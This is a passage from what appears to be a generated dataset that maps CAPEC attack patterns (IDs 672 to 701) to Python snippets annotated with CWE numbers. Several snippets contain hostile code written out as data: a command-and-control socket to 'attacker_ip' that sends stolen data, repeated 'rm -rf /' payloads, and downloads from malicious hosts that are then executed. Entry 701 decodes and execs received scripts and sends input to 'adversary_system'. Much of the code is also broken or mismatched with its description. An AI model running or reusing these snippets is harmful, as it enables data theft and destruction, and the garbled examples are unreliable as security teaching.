        "code_snippet": "import socket\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = b\"\\x90\\x90\\x90\\x90\"  # NOP slide to evade detection\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef replicate_malicious_code():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((\"attacker_ip\", 8080))\n    s.send(b\"Ready to receive commands\")\n    while True:\n        command = s.recv(1024)\n        if command == b\"exit\":\n            break\n        elif command == b\"steal_data\":\n            # CWE-1423: Exposure of Sensitive Information\n            # Shared microarchitectural predictor state\n            # influencing transient execution\n            data = read_sensitive_data()\n            s.send(data)\n        elif command == b\"control_host\":\n            # CWE-1262: Improper Access Control for Register Interface\n            # Memory-mapped I/O registers\n            control_host()\n        elif command == b\"assign_security_token\":\n            # CWE-1259: Improper Restriction of Security Token Assignment\n            assign_security_token()\n\nreplicate_malicious_code()",
        "description": "This Python code snippet demonstrates the CAPEC of maliciously altering a chip's program logic during manufacturing. The code includes embedded malicious code, replicating malicious code, exposure of sensitive information, improper access control for register interface, and improper restriction of security token assignment. The malicious code establishes a connection with an attacker's IP, receives commands, and performs malicious actions such as stealing data, controlling the host, and assigning security tokens."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "import os\nimport git\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nrepo = git.Repo()\n\n# CWE-494: Download of Code Without Integrity Check\nos.system('git pull origin master')\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = '__import__(\"os\").system(\"rm -rf /\")'\n\n# CWE-507: Trojan Horse\nbenign_code = 'print(\"Hello, World!\")'\n\n# CWE-215: Insertion of Sensitive Information Into Debugging Code\ndebugging_code = 'print(\"DEBUG: Database credentials - username: admin, password: password123\")'\n\n# Inject malicious code into the repository\nwith open('main.py', 'a') as f:\n    f.write('\\n' + malicious_code)\n    f.write('\\n' + debugging_code)\n\n# Sign the code with the developer's digital signature\nos.system('git add .')\nos.system('git commit -m \"Update\"')\nos.system('git tag -s v1.0.0')",
        "description": "This code snippet demonstrates a CAPEC attack where a developer's system is compromised, and malicious code is injected into their software development process. The code downloads updates from a remote repository without verifying the integrity of the code, injects malicious and debugging code into the project, and then signs the code with the developer's digital signature. The resulting software appears legitimate but contains hidden malicious functionality."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\nmalicious_function = lambda: os.system('rm -rf /')\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\nsecure_function = lambda: os.system('chmod 700 /')\n\n# CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\nif __debug__:\n    secure_function()\nelse:\n    malicious_function()\n\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\ntry:\n    # Simulate FPGA configuration memory chip reload\n    with open('fpga_config.bin', 'wb') as f:\n        f.write(b'\\x00' * 1024)\nexcept Exception as e:\n    print(f'Error: {e}')\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\ntry:\n    # Simulate voltage and clock glitches\n    with open('fpga_config.bin', 'wb') as f:\n        f.write(b'\\x00' * 1024)\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates the CAPEC of altering the functionality of an FPGA by causing a configuration memory chip reload to introduce a malicious function. The code includes CWE-506 Embedded Malicious Code, CWE-1037 Processor Optimization Removal or Modification of Security-critical Code, CWE-733 Compiler Optimization Removal or Modification of Security-critical Code, CWE-1334 Unauthorized Error Injection Can Degrade Hardware Redundancy, and CWE-1247 Improper Protection Against Voltage and Clock Glitches."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "import os\n\ndef decommission_device(device):\n    # CWE-1266: No scrubbing capability to remove sensitive data\n    # CWE-1301: Incomplete data removal within hardware component\n    # CWE-672: Operating on resource after expiration or release\n    # CWE-226: Sensitive information not removed before reuse\n    # CWE-316: Cleartext storage of sensitive information in memory\n    device_data = {'username': 'admin', 'password': 'password123', 'api_key': '1234567890'}\n    device_memory = os.urandom(1024)\n    device_memory += str(device_data).encode('utf-8')\n    # No scrubbing or data removal before reuse\n    return device_memory\n\ndevice = decommission_device('old_device')\nprint('Decommissioned device memory:', device)\n",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary obtaining decommissioned devices with sensitive information. The code lacks proper scrubbing capabilities, leaving sensitive data in memory and storage devices, making it vulnerable to adversarial attempts to retrieve information."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "from pymongo import MongoClient\n\ndef vulnerable_query(user_input):\n    client = MongoClient('mongodb://localhost:27017/')\n    db = client['mydatabase']\n    collection = db['mycollection']\n    query = {\"$or\": []}\n    for input_part in user_input.split(\" \"):\n        query[\"$or\"].append({\"field\": input_part})\n    collection.find(query)\n\n# Example usage:\nuser_input = \"field1: value1 field2: value2\"\nvulnerable_query(user_input)",
        "description": "This Python code snippet demonstrates a vulnerable NoSQL query construction based on user input. The code uses the PyMongo library to interact with a MongoDB database. The vulnerable_query function takes user input, splits it into parts, and constructs a MongoDB query using the $or operator. The query is then executed on the database without proper input validation or sanitization, making it vulnerable to NoSQL injection attacks."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = b\"\\x90\\x90\\x90\\x90\"  # Replace with actual malicious code\n\n# CWE-1262: Improper Access Control for Register Interface\nregister_interface = ctypes.CDLL(None)\nregister_interface.mmap = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_system_info = os.popen('cat /proc/cpuinfo').read()\nprint(sensitive_system_info)\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ntrace_data = os.popen('cat /sys/kernel/debug/tracing/trace').read()\nprint(trace_data)\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef replicate_malicious_code():\n    # Replicate malicious code to other systems\n    pass\n\n# Insert malicious code into hardware components during development or update\nctypes.memmove(id(register_interface), malicious_code, len(malicious_code))\nreplicate_malicious_code()",
        "description": "This Python code snippet demonstrates the CAPEC of inserting malware in a server motherboard during development or update. It includes CWE-506 by inserting malicious code into the system, CWE-1262 by accessing memory-mapped I/O registers without proper access control, CWE-497 by exposing sensitive system information, CWE-1323 by improperly managing sensitive trace data, and CWE-509 by replicating malicious code to other systems."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = os.environ['SENSITIVE_INFO']\n\n# CWE-377: Insecure Temporary File\nwith tempfile.NamedTemporaryFile() as temp:\n    temp.write(sensitive_info.encode())\n    temp.seek(0)\n    print(temp.read().decode())\n\n# CWE-209: Generation of Error Message Containing Sensitive Information\ntry:\n    with open('non_existent_file', 'r') as f:\n        pass\nexcept FileNotFoundError as e:\n    print(f'Error: {e}. Sensitive info: {sensitive_info}')\n\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\nuser_input = input('Enter a variable name: ')\nexec(f'{user_input} = 5')\nprint(globals()[user_input])\n\n# CWE-426: Untrusted Search Path\nimport sys\nsys.path.insert(0, '/untrusted/path')\nimport untrusted_module\nuntrusted_module.do_something()",
        "description": "This Python code snippet demonstrates the CAPEC of deliberately misconfiguring a system during the build process. It includes multiple CWEs: CWE-497 by exposing sensitive system information, CWE-377 by using an insecure temporary file, CWE-209 by generating an error message with sensitive information, CWE-913 by improperly controlling dynamically-managed code resources, and CWE-426 by using an untrusted search path."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "import ctypes\n\n# CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\nlock_control_bit = 0x01\naddress_region = 0x10000000\nctypes.memset(address_region, 0x00, 0x1000)\n\n# CWE-1252: CPU Hardware Not Configured to Support Exclusivity of Write and Execute Operations\nexecute_data = b'\\x90\\x90\\x90'  # NOP instructions\nctypes.memmove(address_region, execute_data, len(execute_data))\n\n# CWE-1257: Improper Access Control Applied to Mirrored or Aliased Memory Regions\naliased_region = 0x20000000\nctypes.memmove(aliased_region, b'malicious_code', 0x1000)\n\n# CWE-1260: Improper Handling of Overlap Between Protected Memory Ranges\noverlapped_region = 0x15000000\nctypes.memmove(overlapped_region, b'overlap_data', 0x1000)\n\n# CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\nvolatile_memory = 0x30000000\nctypes.memmove(volatile_memory, b'boot_code', 0x1000)\n\n# CWE-1282: Assumed-Immutable Data is Stored in Writable Memory\nimmutable_data = 0x40000000\nctypes.memmove(immutable_data, b'mutable_data', 0x1000)\n\n# CWE-1312: Missing Protection for Mirrored Regions in On-Chip Fabric Firewall\nmirrored_region = 0x50000000\nctypes.memmove(mirrored_region, b'unprotected_data', 0x1000)\n\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\noverlapped_protected_region = 0x60000000\nctypes.memmove(overlapped_protected_region, b'overlapped_data', 0x1000)\n\n# CWE-1326: Missing Immutable Root of Trust in Hardware\nuntrusted_boot_code = 0x70000000\nctypes.memmove(untrusted_boot_code, b'untrusted_boot_code', 0x1000)\n",
        "description": "This code snippet demonstrates the CAPEC of exploiting missing or incorrectly configured access control within memory to read/write data or inject malicious code into said memory. It uses various CWEs to illustrate the vulnerabilities, including insufficient granularity of address regions protected by register locks, lack of CPU hardware support for exclusivity of write and execute operations, improper access control applied to mirrored or aliased memory regions, and more."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "import ctypes\n\ndef modify_register():\n    # CWE-1224: Improper Restriction of Write-Once Bit Fields\n    # CWE-1231: Improper Prevention of Lock Bit Modification\n    # CWE-1233: Security-Sensitive Hardware Controls with Missing Lock Bit Protection\n    # CWE-1262: Improper Access Control for Register Interface\n    # CWE-1283: Mutable Attestation or Measurement Reporting Data\n    register_address = 0x1000\n    lock_bit_address = 0x1004\n    \n    # Disable lock bit protection\n    ctypes.windll.kernel32.WriteProcessMemory(-1, ctypes.c_void_p(lock_bit_address), ctypes.c_char(b'\\x00'), 1)\n    \n    # Write to a register without proper access control\n    ctypes.windll.kernel32.WriteProcessMemory(-1, ctypes.c_void_p(register_address), ctypes.c_char(b'\\x01'), 1)\n    \n    # Modify attestation or measurement reporting data\n    attestation_address = 0x2000\n    ctypes.windll.kernel32.WriteProcessMemory(-1, ctypes.c_void_p(attestation_address), ctypes.c_char(b'\\x02'), 1)\n\nmodify_register()",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting missing or incorrectly configured access control within registers to read/write data that is not meant to be obtained or modified by a user. It uses various CWEs to illustrate the vulnerabilities, including improper restriction of write-once bit fields, improper prevention of lock bit modification, missing lock bit protection, improper access control for register interface, and mutable attestation or measurement reporting data. The code disables lock bit protection, writes to a register without proper access control, and modifies attestation or measurement reporting data, showcasing the potential security risks."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "class SoC:\n    def __init__(self):\n        self.security_tokens = {}\n\n    def generate_security_token(self, entity):\n        # CWE-1270: Generation of Incorrect Security Tokens\n        # Incorrectly generated security token\n        token = 'default_token'\n        self.security_tokens[entity] = token\n\n    def execute_action(self, entity, action):\n        # CWE-1294: Insecure Security Identifier Mechanism\n        # Insecure security identifier mechanism\n        if entity in self.security_tokens:\n            # CWE-1259: Improper Restriction of Security Token Assignment\n            # Improperly protected security token\n            token = self.security_tokens[entity]\n            if token == 'default_token':\n                # CWE-1267: Policy Uses Obsolete Encoding\n                # Obsolete encoding mechanism\n                encoded_action = action.encode('ascii')\n                if encoded_action == b'execute_admin_action':\n                    # CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n                    # Missing source identifier in entity transaction\n                    if 'source_identifier' not in entity:\n                        print('Executing action without source identifier')\n                    else:\n                        print('Executing action with source identifier')\n                else:\n                    print('Executing action with default token')\n            else:\n                print('Executing action with custom token')\n        else:\n            print('Entity not authorized')\n\nsoc = SoC()\nsoc.generate_security_token('admin_entity')\nsoc.execute_action('admin_entity', 'execute_admin_action')",
        "description": "This code snippet demonstrates the CAPEC of an adversary taking advantage of missing or incorrectly configured security identifiers within a System-on-Chip (SoC) to read/write data or execute a given action. The code includes CWE-1259, CWE-1267, CWE-1270, CWE-1294, and CWE-1302 vulnerabilities."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "import hashlib\n\ndef calculate_checksum(firmware_image):\n    return hashlib.sha256(firmware_image.encode()).hexdigest()\n\ndef verify_firmware(firmware_image, expected_checksum):\n    calculated_checksum = calculate_checksum(firmware_image)\n    if calculated_checksum != expected_checksum:\n        print(\"Firmware image has been tampered with. Aborting update.\")\n        return False\n    return True\n\ndef update_firmware(firmware_image):\n    # This function is intentionally left blank, making the firmware non-updatable\n    pass\n\n# Example usage:\nfirmware_image = \"vulnerable_firmware\"\nexpected_checksum = \"1234567890abcdef\"\nif not verify_firmware(firmware_image, expected_checksum):\n    print(\"Firmware update failed\")\nelse:\n    update_firmware(firmware_image)\n",
        "description": "This code snippet demonstrates a vulnerable firmware update mechanism. The `update_firmware` function is intentionally left blank, making the firmware non-updatable (CWE-1277). The `verify_firmware` function checks the integrity of the firmware image using a checksum, but it does not provide a way to update the firmware if the checksum fails (CWE-1310). The code relies on a component (the firmware image) that cannot be updated or patched (CWE-1329). Additionally, the code does not contain circuitry or sensors to detect and mitigate voltage and clock glitches (CWE-1247), making it vulnerable to unauthorized error injection that can degrade hardware redundancy (CWE-1334)."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "import os\n\n# CWE-348: Using less trusted source of metadata\nmetadata_source = 'untrusted_source'\n\n# CWE-290: Authentication Bypass by Spoofing\nusername = 'admin'\npassword = 'password'\n\n# CWE-1230: Exposure of Sensitive Information Through Metadata\nsensitive_info = {'credit_card_number': '1234-5678-9012-3456'}\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\ndestination = 'http://malicious-website.com'\n\n# CWE-494: Download of Code Without Integrity Check\nos.system('wget ' + destination + ' -O malicious_code.py')\n\n# Altering metadata to present malicious resource as legitimate\nos.rename('malicious_code.py', 'legitimate_code.py')\n\n# Using the altered metadata to execute the malicious code\nos.system('python legitimate_code.py')",
        "description": "This code snippet demonstrates the CAPEC of altering metadata to present a malicious resource as legitimate. It uses multiple CWEs to create a vulnerable scenario. First, it uses an untrusted source of metadata (CWE-348). Then, it bypasses authentication using spoofing (CWE-290). It exposes sensitive information through metadata (CWE-1230) and specifies an incorrect destination in a communication channel (CWE-941). Finally, it downloads code without integrity checks (CWE-494) and alters the metadata to present the malicious code as legitimate, executing it without proper verification."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'https://example.com/malicious_package.zip'\nresponse = requests.get(url, verify=False)\nopen('malicious_package.zip', 'wb').write(response.content)\n\n# CWE-348: Use of Less Trusted Source\ntrusted_source = 'https://pypi.org/project/package/'\nless_trusted_source = 'https://example.com/package/'\npackage_info = requests.get(less_trusted_source).json()\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import os; os.system(\"rm -rf /\")'\nwith open('malicious_package/__init__.py', 'a') as f:\n    f.write(malicious_code)\n\n# CWE-290: Authentication Bypass by Spoofing\ndef authenticate(username, password):\n    return True\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nimport vulnerable_component\nvulnerable_component.vulnerable_function()",
        "description": "This Python code snippet demonstrates the CAPEC of spoofing open-source software metadata. It downloads a malicious package from an untrusted source without verifying its integrity (CWE-494), uses a less trusted source for package information (CWE-348), embeds malicious code in the package (CWE-506), bypasses authentication using a spoofing attack (CWE-290), and depends on a vulnerable third-party component (CWE-1395)."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "import git\nimport os\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nrepo_path = '/path/to/repository'\n\n# CWE-540: Inclusion of Sensitive Information in Source Code\nusername = 'malicious_user'\npassword = 'malicious_password'\n\n# CWE-348: Use of Less Trusted Source\ntrusted_repo = 'https://github.com/trusted-user/trusted-repo'\nmalicious_repo = 'https://github.com/malicious-user/malicious-repo'\n\n# CWE-494: Download of Code Without Integrity Check\nos.system(f'git clone {malicious_repo}')\n\n# CWE-508: Non-Replicating Malicious Code\nmalicious_code = 'malicious_code.py'\nwith open(malicious_code, 'w') as f:\n    f.write('print(\"Malicious code executed\")')\n\n# Spoof metadata pertaining to the VCS repository's commits\ncommit_message = 'Spoofed commit message'\ncommit_author = 'Spoofed Author <spoofed@author.com>'\ncommit_date = '2022-01-01 00:00:00'\n\nos.system(f'git config user.name \"{commit_author}\"')\nos.system(f'git commit -m \"{commit_message}\" --date=\"{commit_date}\"')\n",
        "description": "Python code snippet that spoofs metadata pertaining to a Git repository's commits to deceive users into believing that the maliciously provided software is frequently maintained and originates from a trusted source."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'https://example.com/malicious_package.zip'\nresponse = requests.get(url, verify=False)\nopen('package.zip', 'wb').write(response.content)\n\n# CWE-506: Embedded Malicious Code\nimport zipfile\nwith zipfile.ZipFile('package.zip', 'r') as zip_ref:\n    zip_ref.extractall()\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nimport git\nrepo = git.Repo()\nrepo.remotes.origin.pull()\n\n# CWE-348: Use of Less Trusted Source\ntrusted_source = 'https://example.com/trusted_package.json'\nless_trusted_source = 'https://example.com/less_trusted_package.json'\npackage_info = requests.get(less_trusted_source).json()\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nimport vulnerable_component\nvulnerable_component.vulnerable_function()",
        "description": "This Python code snippet demonstrates the CAPEC of spoofing software popularity metadata. It downloads a malicious package from an untrusted source without verifying its integrity, extracts the package, and uses a less trusted source for package information. Additionally, it exposes a version-control repository to an unauthorized control sphere and uses a vulnerable third-party component."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "import os\nimport platform\nimport datetime\nimport getpass\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsystem_info = {'platform': platform.system(), 'platform-release': platform.release(), 'platform-version': platform.version(), 'architecture': platform.machine(), 'processor': platform.processor(), 'username': getpass.getuser()}\n\n# CWE-360: Trust of System Event Data\nevent_location = os.path.expanduser('~') + '/.event_location'\nwith open(event_location, 'w') as f:\n    f.write(str(datetime.datetime.now()))\n\n# CWE-222: Truncation of Security-relevant Information\ntruncated_info = str(system_info)[:50] + '...'\n\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\nacl_file = os.path.expanduser('~') + '/.acl_file'\nwith open(acl_file, 'w') as f:\n    f.write('access_control_list')\n\n# CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution\n# (Note: This CWE is related to hardware-level vulnerabilities and cannot be directly represented in Python code)\n\n# Gather system information\nkeyboard_layout = os.popen('setxkbmap -query').read()\ntimezone = os.popen('timedatectl').read()\n\n# Combine gathered information\ninfo = {'system_info': system_info, 'event_location': event_location, 'truncated_info': truncated_info, 'keyboard_layout': keyboard_layout, 'timezone': timezone}\n\nprint(info)",
        "description": "This Python code snippet demonstrates the CAPEC of gathering system information to identify the system's geographical location. It includes vulnerabilities related to exposure of sensitive system information, trust of system event data, truncation of security-relevant information, exposure of access control list files, and incorrect data forwarding during transient execution."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "import os\nimport git\n\n# CWE-494: Download of Code Without Integrity Check\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n\n# Clone a malicious repository\nrepo_url = 'https://example.com/malicious-repo.git'\nrepo_dir = '/tmp/malicious-repo'\nif not os.path.exists(repo_dir):\n    git.Repo.clone_from(repo_url, repo_dir)\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n# CWE-426: Untrusted Search Path\n\n# Add the malicious repository to the system's PATH\nos.environ['PATH'] += ':' + repo_dir\n\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n\n# Execute a malicious script from the repository\nos.system('python ' + repo_dir + '/malicious_script.py')",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary taking advantage of the redirect property of directly linked Version Control System (VCS) repositories to trick users into incorporating malicious code into their applications. It clones a malicious repository, adds it to the system's PATH, and executes a malicious script from the repository, embodying CWEs 494, 829, 527, 426, and 1265."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "import ctypes\n\n# Define a function to induce a page fault\nctypes.CDLL(None).mmap(0, 4096, 0x1 | 0x2, 0x2, -1, 0)\n\n# Define a function to execute a faulting load instruction\ndef faulting_load(addr):\n    try:\n        ctypes.c_uint64.from_address(addr).value\n    except OSError:\n        pass\n\n# Define a function to execute a microcode assist\ndef microcode_assist(addr):\n    try:\n        ctypes.c_uint64.from_address(addr).value\n    except OSError:\n        pass\n\n# Define a function to execute a victim execution\ndef victim_execution(addr):\n    # Execute a load instruction that may fault\n    faulting_load(addr)\n    # Execute a microcode assist that may induce a page fault\n    microcode_assist(addr)\n    # Execute a gadget to operate on adversary-controlled data\n    gadget = ctypes.CFUNCTYPE(ctypes.c_uint64, ctypes.c_uint64)(0x1000)\n    gadget(addr)\n\n# Define a function to discover victim secrets\ndef discover_secrets(addr):\n    # Use side channel analysis to discover victim secrets\n    # This is a placeholder, as side channel analysis is complex and depends on the specific hardware\n    print(\"Discovered secret:\", addr)\n\n# Execute the victim execution and discover secrets\nvictim_execution(0x1000)\ndiscover_secrets(0x1000)",
        "description": "This code snippet demonstrates the main idea of the CAPEC, which exploits a hardware design flaw in CPU implementation of transient instruction execution. It induces a page fault or microcode assist during victim execution, forcing legitimate victim execution to operate on adversary-controlled data stored in microarchitectural buffers. The code then uses existing code gadgets and side channel analysis to discover victim secrets that have not yet been flushed from microarchitectural state or hijack the system control flow. The related CWEs provide additional context for the vulnerabilities exploited in this code snippet."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "import socket\nimport dhcp\n\n# CWE-291: Reliance on IP Address for Authentication\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-294: Authentication Bypass by Capture-replay\n\n# Create a socket to listen for incoming DHCP requests\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.bind(('', 67))\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\nwhile True:\n    data, addr = sock.recvfrom(1024)\n    print('Received DHCP request from', addr)\n    # Spoof the DHCP response to redirect traffic or deny service\n    spoofed_response = dhcp.DHCPResponse()\n    spoofed_response.your_ip_address = '192.168.1.100'\n    sock.sendto(spoofed_response.pack(), addr)\n",
        "description": "This Python code snippet demonstrates a vulnerable DHCP server implementation that can be exploited by an adversary to masquerade as a legitimate DHCP server. The code relies on IP addresses for authentication, does not properly restrict the communication channel to intended endpoints, and incorrectly specifies the destination in the communication channel. An attacker can spoof DHCP traffic to redirect network traffic or deny service to DHCP clients."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"import os; os.system('rm -rf /')\"\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nuntrusted_library = 'https://example.com/malicious_library.py'\n\n# CWE-494: Download of Code Without Integrity Check\nexec(compile(urllib.request.urlopen(untrusted_library).read(), untrusted_library, 'exec'))\n\n# CWE-426: Untrusted Search Path\nos.environ['PYTHONPATH'] = '/tmp/malicious_path'\n\n# CWE-507: Trojan Horse\nbenign_functionality = 'print(\"This is a benign function\")'\nexec(benign_functionality)\n\n# Install malicious extension\nos.system('pip install --user https://example.com/malicious_extension.whl')",
        "description": "This Python code snippet demonstrates the CAPEC of installing a malicious extension into trusted software. It includes CWE-506 embedded malicious code, CWE-829 inclusion of untrusted functionality, CWE-494 download of code without integrity check, CWE-426 untrusted search path, and CWE-507 Trojan Horse. The code downloads and executes malicious code from an untrusted source, sets an untrusted search path, and installs a malicious extension using pip."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "import socket\nimport numpy as np\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-1300: Improper Protection of Physical Side Channels\n\n# Simulating a vulnerable video transmission system\nvideo_data = b'\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x10\\x11\\x12\\x13\\x14\\x15'  # sensitive information\n\n# CWE-515: Covert Storage Channel\n# CWE-514: Covert Channel\n# CWE-1323: Improper Management of Sensitive Trace Data\n\n# Simulating a covert storage channel using electromagnetic emissions (EME)\ndef transmit_video(video_data):\n    # Simulating the transmission of video data through a vulnerable cable\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('localhost', 8080))\n    sock.sendall(video_data)\n    sock.close()\n\n# Simulating the eavesdropping of video data through electromagnetic emissions (EME)\ndef eavesdrop_video():\n    # Simulating the reception of video data through electromagnetic emissions (EME)\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind(('localhost', 8080))\n    sock.listen(1)\n    conn, addr = sock.accept()\n    video_data = conn.recv(1024)\n    print('Eavesdropped video data:', video_data)\n    conn.close()\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# CWE-319: Cleartext Transmission of Sensitive Information\ntransmit_video(video_data)\neavesdrop_video()",
        "description": "This Python code snippet demonstrates a vulnerable video transmission system that can be eavesdropped through electromagnetic emissions (EME) without modifying any cable or installing software. The code transmits sensitive video data in cleartext through a socket, which can be intercepted by an attacker. The eavesdropping function simulates the reception of video data through EME, highlighting the lack of protection mechanisms to prevent physical side channels from exposing sensitive information."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "import socket\n\n# Establish a communication channel to a trusted endpoint\ntrusted_endpoint = ('10.0.0.1', 8080)\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(trusted_endpoint)\n\n# Receive a message from the trusted endpoint\nmessage = sock.recv(1024)\n\n# Improperly verify the identity of the actor at the other end of the channel\n# CWE-300: Channel Accessible by Non-Endpoint\nif message.startswith('TRUSTED_ENDPOINT'): \n    # CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n    # Assume the message is from the trusted endpoint without proper verification\n    print('Received message from trusted endpoint:', message)\n\n# Mix trusted and untrusted data in the same data structure\n# CWE-501: Trust Boundary Violation\ndata = {'trusted_data': message, 'untrusted_data': 'MALICIOUS_INPUT'}\n\n# Use a fabric bridge for transactions between two IP blocks without proper access control checks\n# CWE-1317: Improper Access Control in Fabric Bridge\nfabric_bridge = {'ip_block1': data, 'ip_block2': 'MALICIOUS_IP_BLOCK'}\n\n# Receive a message from the fabric bridge without ensuring message integrity during transmission\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\nmessage_from_bridge = fabric_bridge['ip_block1']['trusted_data']\nprint('Received message from fabric bridge:', message_from_bridge)\n",
        "description": "This code snippet demonstrates a vulnerable Python script that establishes a communication channel to a trusted endpoint, but fails to properly verify the identity of the actor at the other end of the channel. It also mixes trusted and untrusted data in the same data structure, uses a fabric bridge for transactions between two IP blocks without proper access control checks, and receives a message from the fabric bridge without ensuring message integrity during transmission. This code embodies the main idea of the CAPEC, which involves an adversary using network boundary devices to create a channel to bridge trusted and untrusted networks."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "import socket\nimport threading\nimport json\nimport base64\n\n\ndef handle_client(client_socket):\n    while True:\n        data = client_socket.recv(1024)\n        if not data:\n            break\n        # CWE-294: No authentication mechanism in place\n        # CWE-345: No verification of data authenticity\n        # CWE-602: Client-side enforcement of server-side security\n        # CWE-368: Context switching race condition\n        # CWE-830: Inclusion of web functionality from an untrusted source\n        command = json.loads(data)\n        if command['type'] == 'connect':\n            # Establish a remote desktop connection\n            # CWE-830: Including web functionality from an untrusted source\n            exec(base64.b64decode(command['script']))\n        elif command['type'] == 'send_input':\n            # CWE-368: Context switching race condition\n            # CWE-602: Client-side enforcement of server-side security\n            # CWE-345: No verification of data authenticity\n            # CWE-294: No authentication mechanism in place\n            threading.Thread(target=send_input, args=(command['input'],)).start()\n\n\ndef send_input(input):\n    # CWE-368: Context switching race condition\n    # CWE-602: Client-side enforcement of server-side security\n    # CWE-345: No verification of data authenticity\n    # CWE-294: No authentication mechanism in place\n    # Establish a connection to the adversary's system\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.connect(('adversary_system', 8080))\n    server_socket.sendall(input.encode())\n    server_socket.close()\n\n\ndef main():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('0.0.0.0', 8080))\n    server_socket.listen(5)\n    while True:\n        client_socket, address = server_socket.accept()\n        threading.Thread(target=handle_client, 